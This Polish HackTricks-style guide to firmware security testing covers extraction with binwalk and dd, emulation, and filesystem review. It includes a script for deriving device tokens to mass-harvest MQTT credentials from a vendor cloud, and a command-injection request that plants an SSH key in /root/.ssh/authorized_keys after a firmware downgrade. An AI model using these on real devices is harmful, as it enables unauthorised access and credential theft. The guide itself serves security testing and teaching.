# Analiza oprogramowania układowego

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Oprogramowanie układowe (firmware) to kluczowe oprogramowanie, które pozwala urządzeniom poprawnie działać, zarządzając i ułatwiając komunikację między komponentami sprzętowymi a oprogramowaniem, z którym interagują użytkownicy. Jest przechowywane w pamięci trwałej, co zapewnia urządzeniu dostęp do niezbędnych instrukcji od momentu uruchomienia zasilania, prowadząc do startu systemu operacyjnego. Badanie i ewentualna modyfikacja firmware to istotny krok w identyfikowaniu luk bezpieczeństwa.

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy początkowy etap w rozumieniu budowy urządzenia i technologii, których używa. Proces ten obejmuje zbieranie danych o:

- Architektura CPU i system operacyjny, który na nim działa
- Szczegóły bootloadera
- Układ sprzętowy i dokumentacja (datasheets)
- Metryki bazy kodu i lokalizacje źródeł
- Biblioteki zewnętrzne i typy licencji
- Historia aktualizacji i certyfikacje regulacyjne
- Diagramy architektury i przepływu
- Oceny bezpieczeństwa i zidentyfikowane podatności

W tym celu narzędzia **open-source intelligence (OSINT)** są nieocenione, podobnie jak analiza dostępnych komponentów open-source za pomocą przeglądu ręcznego i automatycznego. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do znalezienia potencjalnych problemów.

## **Pozyskiwanie oprogramowania układowego**

Uzyskanie oprogramowania układowego można przeprowadzić na różne sposoby, każdy o innym stopniu skomplikowania:

- **Bezpośrednio** od źródła (twórcy, producenci)
- **Budując** je na podstawie dostarczonych instrukcji
- **Pobierając** ze stron wsparcia producenta
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Dostęp do **przechowywania w chmurze** bezpośrednio, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytywanie **aktualizacji** za pomocą technik man-in-the-middle
- **Wyodrębnianie** z urządzenia przez połączenia takie jak **UART**, **JTAG**, lub **PICit**
- Sniffing żądań aktualizacji w komunikacji urządzenia
- Identyfikacja i wykorzystanie **hardcoded update endpoints**
- Dumping z bootloadera lub sieci
- Usunięcie i odczytanie układu pamięci, gdy wszystko inne zawiedzie, z użyciem odpowiednich narzędzi sprzętowych

## Analiza oprogramowania układowego

Teraz, gdy **masz oprogramowanie układowe**, musisz wydobyć z niego informacje, aby wiedzieć, jak je dalej traktować. Różne narzędzia, których można do tego użyć:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz wiele za pomocą tych narzędzi, sprawdź **entropy** obrazu za pomocą `binwalk -E <bin>` — jeśli jest niskie, to prawdopodobnie nie jest zaszyfrowany. Jeśli jest wysokie, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych we firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Lub [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do analizy pliku.

### Uzyskanie systemu plików

Dzięki wcześniej wymienionym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś być w stanie **wyodrębnić system plików**.\
Binwalk zazwyczaj wypakowuje go do **folderu nazwanego zgodnie z typem systemu plików**, który zwykle jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie wykryje magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **find the offset of the filesystem and carve the compressed filesystem** z binarki oraz ręcznie wypakować system plików zgodnie z jego typem, stosując poniższe kroki.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące **dd command**, carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można też uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki będą znajdować się w katalogu `squashfs-root`.

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza Firmware

Po uzyskaniu firmware ważne jest jego rozbicie na części, aby zrozumieć strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wyodrębnienia wartościowych danych z obrazu firmware.

### Narzędzia do analizy wstępnej

Zestaw poleceń podano do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają w identyfikacji typów plików, wyodrębnianiu strings, analizie danych binarnych oraz zrozumieniu szczegółów partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zaleca się narzędzia i zasoby takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Używając `binwalk -ev <bin>`, zwykle można wyodrębnić system plików, często do katalogu nazwanego typem systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpozna typu systemu plików z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnienie. Polega to na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), stosuje się różne polecenia do ręcznego wypakowania zawartości.

### Analiza systemu plików

Po wypakowaniu systemu plików zaczyna się poszukiwanie wad bezpieczeństwa. Zwraca się uwagę na niebezpieczne demony sieciowe, hardcoded credentials, punkty końcowe API, funkcjonalności update servera, niekompilowany kod, skrypty startowe oraz skompilowane binaria do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** and **etc/passwd** w poszukiwaniu poświadczeń użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych podatności
- Osadzone binaria do dalszej analizy
- Typowe serwery WWW urządzeń IoT i binaria

Kilka narzędzi pomaga w wykrywaniu wrażliwych informacji i podatności w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania wrażliwych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych binariów

Zarówno kod źródłowy, jak i skompilowane binaria znalezione w systemie plików muszą być przeanalizowane pod kątem podatności. Narzędzia takie jak **checksec.sh** dla binariów Unix i **PESecurity** dla binariów Windows pomagają zidentyfikować niechronione binaria, które mogą zostać wykorzystane.

## Pozyskiwanie konfiguracji chmurowej i poświadczeń MQTT poprzez pochodne tokeny URL

Wiele hubów IoT pobiera konfigurację per-urządzenie z endpointu chmurowego, który wygląda tak:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Podczas analizy firmware możesz odkryć, że <token> jest generowany lokalnie z device ID przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Taki mechanizm pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację chmurową, często ujawniając jawne poświadczenia MQTT i prefiksy tematów.

Praktyczny przebieg:

1) Wyodrębnij deviceId z logów bootowania UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących cloud config URL pattern i broker address, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Załaduj binaria do Ghidra/radare2 i wyszukaj ścieżkę konfiguracyjną ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- W Bashu wyprowadź token i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pozyskaj cloud config i MQTT credentials

- Skomponuj URL i pobierz JSON za pomocą curl; sparsuj za pomocą jq, aby wyodrębnić secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj nieszyfrowane MQTT i słabe topic ACLs (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować maintenance topics i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne ID urządzeń (na dużą skalę, z autoryzacją)

- Wiele ekosystemów osadza bajty OUI producenta/product/type, po których następuje sekwencyjny sufiks.
- Możesz iterować potencjalne ID, wyprowadzać tokens i pobierać configs programowo:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Zawsze uzyskaj wyraźną autoryzację przed przystąpieniem do mass enumeration.
- W miarę możliwości preferuj emulation lub static analysis, aby odzyskać sekrety bez modyfikowania docelowego sprzętu.

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

Do badania pojedynczych programów kluczowe jest określenie endianness programu oraz CPU architecture.

#### Example with MIPS Architecture

Aby emulować binarkę dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia do emulacji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

Dla binariów ARM proces jest podobny — do emulacji używa się `qemu-arm`.

### Full System Emulation

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware'u, automatyzując proces i wspierając analizę dynamiczną.

## Dynamic Analysis in Practice

Na tym etapie używa się środowiska rzeczywistego lub emulowanego urządzenia do analizy. Istotne jest utrzymanie shell access do OS i filesystemu. Emulacja może nie odzwierciedlać w pełni interakcji z hardwarem, co czasami wymaga restartów emulacji. Analiza powinna ponownie przeszukać filesystem, wykorzystać ujawnione strony WWW i usługi sieciowe oraz zbadać luki w bootloaderze. Testy integralności firmware są kluczowe do identyfikacji potencjalnych backdoorów.

## Runtime Analysis Techniques

Analiza w czasie wykonywania polega na interakcji z procesem lub binarnym plikiem w jego środowisku uruchomieniowym, z użyciem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpoints i identyfikowania luk przy pomocy fuzzingu oraz innych technik.

## Binary Exploitation and Proof-of-Concept

Opracowanie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia docelowej architektury oraz programowania w językach niskiego poziomu. Ochrony runtime binariów w systemach embedded są rzadkie, ale gdy występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

## Prepared Operating Systems for Firmware Analysis

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) dostarczają wcześniej skonfigurowane środowiska do testów bezpieczeństwa firmware'u, wyposażone w niezbędne narzędzia.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do wspomagania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza czas, dostarczając prekonfigurowane środowisko z wszystkimi potrzebnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system oparty na Ubuntu 18.04, wstępnie załadowany narzędziami do testów bezpieczeństwa firmware'u.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Nawet gdy vendor wdroży sprawdzanie podpisów kryptograficznych dla obrazów firmware, **ochrona przed version rollback (downgrade) jest często pomijana**. Gdy boot- lub recovery-loader weryfikuje jedynie podpis za pomocą wbudowanego klucza publicznego, ale nie porównuje *wersji* (lub monotonicznego licznika) obrazu, który ma być wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal posiada ważny podpis**, i w ten sposób ponownie wprowadzić załatane luki.

Typowy przebieg ataku:

1. **Obtain an older signed image**
* Pobierz go z publicznego portalu download vendor'a, CDN lub strony wsparcia.
* Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. wewnątrz Android APK pod `assets/firmware/`).
* Pozyskaj go z repozytoriów osób trzecich, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Wiele konsumenckich urządzeń IoT udostępnia *unauthenticated* HTTP(S) endpoints, które przyjmują Base64-encoded firmware blobs, dekodują je po stronie serwera i wywołują recovery/upgrade.
3. Po downgrade'ie wykorzystaj podatność, która została załatana w nowszym wydaniu (np. filtr command-injection dodany później).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (przywróconym do starszej wersji) firmware parametr `md5` jest konkatenowany bezpośrednio do polecenia powłoki bez walidacji, co pozwala na wstrzyknięcie dowolnych poleceń (tutaj — umożliwiając dostęp root oparty na kluczu SSH). Nowsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed obniżeniem wersji czyni poprawkę bezużyteczną.

### Wyodrębnianie Firmware z aplikacji mobilnych

Wielu producentów dołącza pełne obrazy firmware do swoich aplikacji mobilnych towarzyszących, dzięki czemu aplikacja może zaktualizować urządzenie przez Bluetooth/Wi‑Fi. Takie paczki są często przechowywane niezaszyfrowane w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` pozwalają wyciągnąć podpisane obrazy bez dotykania fizycznego sprzętu.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista kontrolna do oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *update endpoint* jest odpowiednio chronione (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **version numbers** lub **monotonic anti-rollback counter** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach secure boot chain (np. podpisy sprawdzane przez ROM code)?
* Czy userland code wykonuje dodatkowe sanity checks (np. allowed partition map, model number)?
* Czy *partial* lub *backup* update flows ponownie używają tej samej logiki walidacji?

> 💡 Jeśli którekolwiek z powyższych brakuje, platforma prawdopodobnie jest podatna na rollback attacks.

## Firmware podatne do ćwiczeń

Aby ćwiczyć odkrywanie podatności w firmware, użyj następujących projektów firmware podatnych jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Źródła

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
